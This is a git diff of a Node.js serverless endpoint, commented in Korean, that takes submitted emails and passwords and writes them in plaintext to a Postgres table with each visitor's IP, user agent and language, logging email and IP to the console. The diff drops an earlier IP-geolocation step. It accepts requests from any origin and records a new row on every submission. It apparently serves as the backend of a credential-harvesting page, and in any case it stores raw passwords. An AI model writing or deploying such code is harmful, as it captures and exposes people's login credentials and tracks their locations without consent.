@@ -7,26 +7,6 @@ const pool = new Pool({
     }
 });
 
-// IP 기반 위치 정보 조회 함수
-async function lookupIpGeo(ip) {
-    try {
-        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,lat,lon`);
-        const data = await response.json();
-        if (data.status !== 'success') return {};
-        return {
-            country: data.country || null,
-            region: data.regionName || null,
-            city: data.city || null,
-            isp: data.isp || null,
-            ip_lat: data.lat ?? null,
-            ip_lon: data.lon ?? null,
-        };
-    } catch (err) {
-        console.error('IP 위치 조회 실패:', err.message);
-        return {};
-    }
-}
-
 module.exports = async (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -44,42 +24,38 @@ module.exports = async (req, res) => {
         }
 
         try {
-            // 1. 테이블이 없다면 기본 생성
+            // 1. 테이블이 없다면 생성
             await pool.query(`
                 CREATE TABLE IF NOT EXISTS users (
                     id SERIAL PRIMARY KEY,
                     email TEXT,
                     password TEXT,
+                    ip TEXT,
+                    user_agent TEXT,
+                    language TEXT,
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 );
             `);
 
-            // 2. 누락된 컬럼이 있다면 안전하게 자동 추가 (ALTER TABLE)
+            // 2. 누락된 컬럼 안전 추가
             await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS ip TEXT;`);
             await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS user_agent TEXT;`);
             await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS language TEXT;`);
-            await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS country TEXT;`);
-            await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS city TEXT;`);
 
-            // 3. IP 기반 위치 정보 조회
-            const geo = ip ? await lookupIpGeo(ip) : {};
-
-            // 4. 데이터베이스에 로그인 정보 및 IP/위치 정보 저장
+            // 3. 데이터베이스에 정보 저장
             const query = `
-                INSERT INTO users (email, password, ip, user_agent, language, country, city) 
-                VALUES ($1, $2, $3, $4, $5, $6, $7)
+                INSERT INTO users (email, password, ip, user_agent, language) 
+                VALUES ($1, $2, $3, $4, $5)
             `;
             await pool.query(query, [
                 email, 
                 password, 
                 ip || null, 
                 user_agent || null, 
-                language || null, 
-                geo.country || null, 
-                geo.city || null
+                language || null
             ]);
 
-            console.log(`[Neon DB 저장 성공] 이메일: ${email} / IP: ${ip} (${geo.country || '알 수 없음'})`);
+            console.log(`[Neon DB 저장 성공] 이메일: ${email} / IP: ${ip}`);
 
             return res.status(200).json({ 
                 success: true, 
@@ -87,7 +63,7 @@ module.exports = async (req, res) => {
             });
 
         } catch (error) {
-            console.error('Neon DB 에러:', error);
+            console.error('Neon DB 에러 상세:', error);
             return res.status(500).json({ 
                 success: false, 
                 message: '데이터베이스 저장 중 오류가 발생했습니다.', 
